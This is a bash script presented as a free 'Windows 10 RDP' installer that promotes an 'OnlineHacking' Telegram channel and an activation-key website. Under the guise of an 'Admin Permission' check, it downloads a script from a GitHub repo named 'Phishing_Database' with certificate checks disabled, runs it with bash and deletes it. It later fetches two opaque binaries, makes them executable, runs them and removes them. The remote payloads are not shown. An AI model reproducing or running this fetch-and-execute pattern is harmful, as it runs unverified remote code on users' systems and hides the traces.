#!/bin/bash

check_status() {
        echo -ne "\e[33m Internet Status : "
        timeout 3s curl -fIs "https://api.github.com" > /dev/null
        [ $? -eq 0 ] && echo -e "\e[92m Online\e[0m" || echo -e "\e[31mOffline\e[0m"
}

check_update () {
echo ""
echo -ne "\e[33m Admin Permission : " && rm -rf admin && curl -sLkO https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Win10RDP/admin && bash admin && rm -rf admin
echo ""
sleep 1
}


logo1() {
echo -e ""
echo -e "\e[33m
  ______   .__   __.  __       __  .__   __.  _______     __    __       ___       ______  __  ___  __  .__   __.   _______ 
 /  __  \  |  \ |  | |  |     |  | |  \ |  | |   ____|   |  |  |  |     /   \     /      ||  |/  / |  | |  \ |  |  /  _____|
|  |  |  | |   \|  | |  |     |  | |   \|  | |  |__      |  |__|  |    /  ^  \   |  ,----'|  '  /  |  | |   \|  | |  |  __  
|  |  |  | |  . .  | |  |     |  | |  . .  | |   __|     |   __   |   /  /_\  \  |  |     |    <   |  | |  . .  | |  | |_ | 
|  ~--~  | |  |\   | |  -----.|  | |  |\   | |  |____    |  |  |  |  /  _____  \ |  .----.|  .  \  |  | |  |\   | |  |__| | 
 \______/  |__| \__| |_______||__| |__| \__| |_______|   |__|  |__| /__/     \__\ \______||__|\__\ |__| |__| \__|  \______|  \e[0m\n"
 
  echo""    
  echo -e $'\e[1;33m\e[0m\e[1;31m  ██████████\e[0m'"\e[1;37m██████████"'\e[1;33m\e[0m\e[0;32m██████████\e[0m' '\e[1;32m\e[0m\e[1;33m IF IT GOT ANY ERROR, CLOSE PWD SESSION AND START AGAIN \e[0m'                                       
  echo ""
   echo -e $'\e[1;33m\e[0m\e[1;33m  [\e[0m\e[1;32m Join Our Telegram :- \e[36mhttps://t.me/OnlineHacking \e[0m\e[1;32m\e[0m\e[1;33m] \e[0m'
   echo " "
}


echo ""
clear
echo ""
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m OnlineHacking :\e[1;32m Join Telegram Channel \e[1;33m @OnlineHacking  !\e[0m"
echo ""
echo ""
sleep 5
echo ""
echo ""
check_status
check_update
sleep 2
echo ""
clear
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Windows 10 RDP Tool Please Wait....  \e[0m"
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!             KEY REQUIREMENTS         !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
echo ""
echo -e ""
echo -e "\e[33m
      ██╗  ██╗███████╗██╗   ██╗
      ██║ ██╔╝██╔════╝╚██╗ ██╔╝
      █████╔╝ █████╗   ╚████╔╝
      ██╔═██╗ ██╔══╝    ╚██╔╝
      ██║  ██╗███████╗   ██║
      ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[92m Activation Key 100% Free. Dont Buy  \e[34m( \e[1;36m \e[34m) \e[0m"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Link and Generate Windows 10 RDP Key \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://wwu.onlinehacking.org/pwd-windows-key/  "
echo ""
echo ""
read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter 6 Digit Activation Key : \e[0m\e[97m' option
echo""
echo""
echo""
if [[ $option == *'M86'* ]]; then
clear
echo ""
rm -rf suman mrsuman
echo ""
curl -sLkO https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/Win10RDP/suman 
curl -sLkO https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/Win10RDP/mrsuman 
echo ""
chmod +x suman 
chmod +x mrsuman
echo ""
clear
echo -e "\e[1;96m  \e[m "
printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
echo
printf "\e[1;31m[\e[0m\e[1;92m1\e[0m\e[1;31m] \e[0m\e[1;37;44m Guacamole \e[0m "
echo
printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"  
echo 
printf "\e[1;31m[\e[0m\e[1;92m2\e[0m\e[1;31m] \e[0m\e[1;37;41m No Guacamole * \e[0m \e[0;91m[\e[0;96m Recommended\e[0;91m]   "
echo 
printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
echo
printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
echo


read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[92m You Want to Choose One : \e[97m ' portfrd
if [[ $portfrd == "1" || $portfrd == "01" || $portfrd == "suman" ]]; then
echo ""
clear
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[92m Visit this website and know how to use it. \e[34m) \e[0m"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Login ID Password is given in this Website \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://wwu.onlinehacking.org/pwd-windows-rdp-for-lifetime-free/  "
echo ""
echo ""
read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to Start RDP : \e[0m\e[97m' option
echo ""
clear
echo ""
logo1
echo -e " "
./suman
rm -rf suman
echo ""
			   

fi
if [[ $portfrd == "2" || $portfrd == "02" || $portfrd == "mrsuman" ]]; then
echo ""
clear
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[92m Visit this website and know how to use it. \e[34m) \e[0m"
echo ""
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Login ID Password is given in this Website \e[0m"
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://wwu.onlinehacking.org/pwd-windows-rdp-for-lifetime-free/  "
echo ""
echo ""
read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to Start RDP : \e[0m\e[97m' option
echo ""
clear
echo ""
logo1
echo -e " "
./mrsuman
rm -rf mrsuman
echo ""
fi

echo ""
fi
echo ""